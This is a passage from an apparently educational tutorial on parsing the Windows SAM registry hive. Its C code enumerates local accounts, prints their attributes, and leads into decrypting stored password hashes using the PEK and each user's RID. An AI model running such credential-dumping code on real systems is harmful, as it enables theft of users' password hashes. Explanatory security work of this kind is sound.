		Status <span class="token operator">=</span> <span class="token function">NtEnumerateKey</span><span class="token punctuation">(</span>UsersKey<span class="token punctuation">,</span> Index<span class="token punctuation">,</span> KeyBasicInformation<span class="token punctuation">,</span> SubkeyInformation<span class="token punctuation">,</span> USER_SUBKEY_INFORMATION_SIZE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not query the subkey with index %lu: 0x%08lX"</span><span class="token punctuation">,</span> Index<span class="token punctuation">,</span> Status<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token operator">-&gt;</span>Length <span class="token operator">=</span> KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token operator">-&gt;</span>MaximumLength <span class="token operator">=</span> SubkeyInformation<span class="token operator">-&gt;</span>NameLength<span class="token punctuation">;</span>
		KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token operator">-&gt;</span>Buffer <span class="token operator">=</span> SubkeyInformation<span class="token operator">-&gt;</span>Name<span class="token punctuation">;</span>

		<span class="token comment">//</span>
		<span class="token comment">// Open a handle to the subkey</span>
		<span class="token comment">//</span>

		HANDLE SubkeyHandle<span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>OpenKeyEx <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			Status <span class="token operator">=</span> <span class="token function">NtOpenKey</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SubkeyHandle<span class="token punctuation">,</span> KEY_READ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">{</span>
			Status <span class="token operator">=</span> <span class="token function">OpenKeyEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>SubkeyHandle<span class="token punctuation">,</span> KEY_READ<span class="token punctuation">,</span> <span class="token operator">&amp;</span>KeyAttributes<span class="token punctuation">,</span> REG_OPTION_BACKUP_RESTORE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"Could not open a handle to the %wZ key: 0x%08lX"</span><span class="token punctuation">,</span> KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">//</span>
		<span class="token comment">// Query the fixed and variable attributes of the user</span>
		<span class="token comment">//</span>

		UCHAR                FixedDataBuffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		PSAM_USER_FIXED_DATA UserFixedData <span class="token operator">=</span> <span class="token punctuation">(</span>PSAM_USER_FIXED_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PKEY_VALUE_PARTIAL_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">(</span>FixedDataBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>

		Status <span class="token operator">=</span> <span class="token function">NtQueryValueKey</span><span class="token punctuation">(</span>SubkeyHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FixedAttributesValueName<span class="token punctuation">,</span> KeyValuePartialInformation<span class="token punctuation">,</span> FixedDataBuffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{</span>
			PKEY_VALUE_PARTIAL_INFORMATION ValueInformation<span class="token punctuation">;</span>
			Status <span class="token operator">=</span> <span class="token function">QueryUserVariableAttributes</span><span class="token punctuation">(</span>SubkeyHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ValueInformation<span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
			<span class="token punctuation">{</span>
				PSAM_USER_VARIABLE_DATA UserVariableData <span class="token operator">=</span> <span class="token punctuation">(</span>PSAM_USER_VARIABLE_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>ValueInformation<span class="token operator">-&gt;</span>Data<span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">//</span>
				<span class="token comment">// Print the username and RID</span>
				<span class="token comment">//</span>

				UNICODE_STRING UserName<span class="token punctuation">;</span>
				UserName<span class="token punctuation">.</span>Length <span class="token operator">=</span> UserName<span class="token punctuation">.</span>MaximumLength <span class="token operator">=</span> UserVariableData<span class="token operator">-&gt;</span>UserName<span class="token punctuation">.</span>Length<span class="token punctuation">;</span>
				UserName<span class="token punctuation">.</span>Buffer <span class="token operator">=</span> <span class="token punctuation">(</span>PWCHAR<span class="token punctuation">)</span><span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>UserName<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token function">PrintUsernameAndRid</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserName<span class="token punctuation">,</span> KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">//</span>
				<span class="token comment">// As explained in the overview of the NT hash obfuscation mechanism, </span>
				<span class="token comment">// the user's RID is the key for the DES encryption layer</span>
				<span class="token comment">//</span>

				ULONG UserRid <span class="token operator">=</span> <span class="token function">wcstoul</span><span class="token punctuation">(</span>KeyAttributes<span class="token punctuation">.</span>ObjectName<span class="token operator">-&gt;</span>Buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">//</span>
				<span class="token comment">// Print the fixed attributes</span>
				<span class="token comment">//</span>

				<span class="token function">PrintUserFixedData</span><span class="token punctuation">(</span>UserFixedData<span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">//</span>
				<span class="token comment">// Print the variable attributes, including password hashes</span>
				<span class="token comment">//</span>

				<span class="token function">PrintUserVariableData</span><span class="token punctuation">(</span>UserVariableData<span class="token punctuation">,</span> PasswordEncryptionKey<span class="token punctuation">,</span> UserRid<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ValueInformation<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>

		<span class="token function">NtClose</span><span class="token punctuation">(</span>SubkeyHandle<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token function">NtClose</span><span class="token punctuation">(</span>UsersKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//</span>
<span class="token comment">// Small wrapper around NtQueryValueKey</span>
<span class="token comment">//</span>
NTSTATUS <span class="token function">QueryUserVariableAttributes</span><span class="token punctuation">(</span>_In_ HANDLE KeyHandle<span class="token punctuation">,</span> _Out_ PKEY_VALUE_PARTIAL_INFORMATION<span class="token operator">*</span> ValueInformation<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	ULONG    ResultLength<span class="token punctuation">;</span>
	NTSTATUS Status <span class="token operator">=</span> <span class="token function">NtQueryValueKey</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>VariableAttributesValueName<span class="token punctuation">,</span> KeyValuePartialInformation<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>Status <span class="token operator">!=</span> STATUS_BUFFER_TOO_SMALL<span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	PKEY_VALUE_PARTIAL_INFORMATION ValueInfo <span class="token operator">=</span> <span class="token punctuation">(</span>PKEY_VALUE_PARTIAL_INFORMATION<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> ResultLength<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>ValueInfo <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">return</span> STATUS_INSUFFICIENT_RESOURCES<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	Status <span class="token operator">=</span> <span class="token function">NtQueryValueKey</span><span class="token punctuation">(</span>KeyHandle<span class="token punctuation">,</span> <span class="token operator">&amp;</span>VariableAttributesValueName<span class="token punctuation">,</span> KeyValuePartialInformation<span class="token punctuation">,</span> ValueInfo<span class="token punctuation">,</span> ResultLength<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ResultLength<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>Status<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> ValueInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token operator">*</span>ValueInformation <span class="token operator">=</span> ValueInfo<span class="token punctuation">;</span>
	<span class="token keyword">return</span> Status<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>As with the domain fixed attributes, we will print the user's fixed 
attributes one at a time to better understand them. This is achieved by 
the <code>PrintUserFixedData</code> function. The function has a single parameter:</p>
<ul>
<li><code>UserFixedData</code> - A pointer to a structure detailing the fixed attributes of a specific user.</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">PrintUserFixedData</span><span class="token punctuation">(</span>_In_ PSAM_USER_FIXED_DATA UserFixedData<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Fixed attributes: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" Version: %hu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>Version<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The last time this user logged on</span>
	<span class="token comment">//</span>

	SYSTEMTIME Time<span class="token punctuation">;</span>
	<span class="token function">FileTimeToSystemTime</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PFILETIME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserFixedData<span class="token operator">-&gt;</span>LastLogon<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Time<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" LastLogon: %lu/%lu/%lu %lu:%lu:%lu\n"</span><span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wDay<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMonth<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wYear<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wHour<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMinute<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wSecond<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The last time this user logged off</span>
	<span class="token comment">//</span>

	<span class="token function">FileTimeToSystemTime</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PFILETIME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserFixedData<span class="token operator">-&gt;</span>LastLogoff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Time<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" LastLogoff: %lu/%lu/%lu %lu:%lu:%lu\n"</span><span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wDay<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMonth<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wYear<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wHour<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMinute<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wSecond<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The last time a user changed their password</span>
	<span class="token comment">//</span>

	<span class="token function">FileTimeToSystemTime</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PFILETIME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserFixedData<span class="token operator">-&gt;</span>PasswordLastSet<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Time<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" PasswordLastSet: %lu/%lu/%lu %lu:%lu:%lu\n"</span><span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wDay<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMonth<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wYear<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wHour<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMinute<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wSecond<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Account expiry date. If this value is 0 or 0x7FFFFFFFFFFFFFFF, the account has not been configured to expire</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserFixedData<span class="token operator">-&gt;</span>AccountExpires<span class="token punctuation">.</span>QuadPart <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> UserFixedData<span class="token operator">-&gt;</span>AccountExpires<span class="token punctuation">.</span>QuadPart <span class="token operator">==</span> <span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" AccountExpires: Never\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token punctuation">}</span>
	<span class="token keyword">else</span>
	<span class="token punctuation">{</span>
		<span class="token function">FileTimeToSystemTime</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PFILETIME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserFixedData<span class="token operator">-&gt;</span>AccountExpires<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Time<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" AccountExpires: %lu/%lu/%lu %lu:%lu:%lu\n"</span><span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wDay<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMonth<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wYear<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wHour<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMinute<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wSecond<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// The last time the user attempted to log on using an incorrect password</span>
	<span class="token comment">//</span>

	<span class="token function">FileTimeToSystemTime</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PFILETIME<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>UserFixedData<span class="token operator">-&gt;</span>LastBadPasswordTime<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>Time<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" LastBadPasswordTime: %lu/%lu/%lu %lu:%lu:%lu\n"</span><span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wDay<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMonth<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wYear<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wHour<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wMinute<span class="token punctuation">,</span> Time<span class="token punctuation">.</span>wSecond<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// User's RID</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" UserId: %lu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>UserId<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// RID of the group that this user is implicitly part of</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" PrimaryGroupId: %lu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>PrimaryGroupId<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Attribute that specify the password, lockout, disable/enable, script, and home directory behavior for the user.</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" UserAccountControl: %lu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>UserAccountControl<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Legacy localization info</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" CountryCode: %hu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>CountryCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" CodePage: %hu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>CodePage<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The number of times this user has attempted to log on with an incorrect password.</span>
	<span class="token comment">// Reset to 0 when the user successfully logs on</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" BadPasswordCount: %hu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>BadPasswordCount<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// The amount of times this user has logged on</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" LogonCount: %lu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>LogonCount<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Is this account part of a privileged group?</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" AdminCount: %lu\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>AdminCount<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//</span>
	<span class="token comment">// Not defined in MS-ADTS</span>
	<span class="token comment">//</span>

	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" OperatorCount: %lu\n\n"</span><span class="token punctuation">,</span> UserFixedData<span class="token operator">-&gt;</span>OperatorCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>Finally, we will use <code>PrintUserVariableData</code> to print the user variable attributes, including the password hashes and password history. Remember the <code>PasswordHistoryLength</code> member of the domain fixed attributes; if this value is non-zero, the SAM will store an array of the last <code>PasswordHistoryLength</code> password hashes in the variable attribute of user. Password related attributes are decrypted and printed using <code>DecryptHash</code> which will be explained shortly.</p>
<ul>
<li>
<p><code>UserVariableData</code> - A pointer to the <code>SAM_USER_VARIABLE_DATA</code> attribute table of a specific user.</p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to the PEK. Used by <code>DecryptHash</code> in the decryption process.</p>
</li>
<li>
<p><code>UserRid</code> - The user's RID. Used by <code>DecryptHash</code> in the decryption process.</p>
</li>
</ul>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">PrintUserVariableData</span><span class="token punctuation">(</span>_In_ PSAM_USER_VARIABLE_DATA UserVariableData<span class="token punctuation">,</span> _In_ PUCHAR PasswordEncryptionKey<span class="token punctuation">,</span> _In_ ULONG UserRid<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"- Variable attributes: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>FullName<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">"FullName: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>FullName<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>FullName<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Description of the user</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Comment<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" Comment: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Comment<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>Comment<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>UserComment<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" UserComment: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>UserComment<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>UserComment<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// The home directory of the user</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>Homedir<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" Homedir: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Homedir<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>Homedir<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>HomedirConnect<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" HomedirConnect: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>HomedirConnect<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>HomedirConnect<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Specifies a path to the user's profile</span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>ProfilePath<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" ProfilePath: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>ProfilePath<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>ProfilePath<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
	<span class="token comment">// Path for the user's logon script, if one exists </span>
	<span class="token comment">//</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>UserVariableData<span class="token operator">-&gt;</span>ScriptPath<span class="token punctuation">.</span>Length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token function">wprintf</span><span class="token punctuation">(</span>L<span class="token string">" ScriptPath: %.*ws\n"</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>ScriptPath<span class="token punctuation">.</span>Length <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>WCHAR<span class="token punctuation">)</span><span class="token punctuation">,</span> UserVariableData<span class="token operator">-&gt;</span>Data <span class="token operator">+</span> UserVariableData<span class="token operator">-&gt;</span>ScriptPath<span class="token punctuation">.</span>Offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//</span>
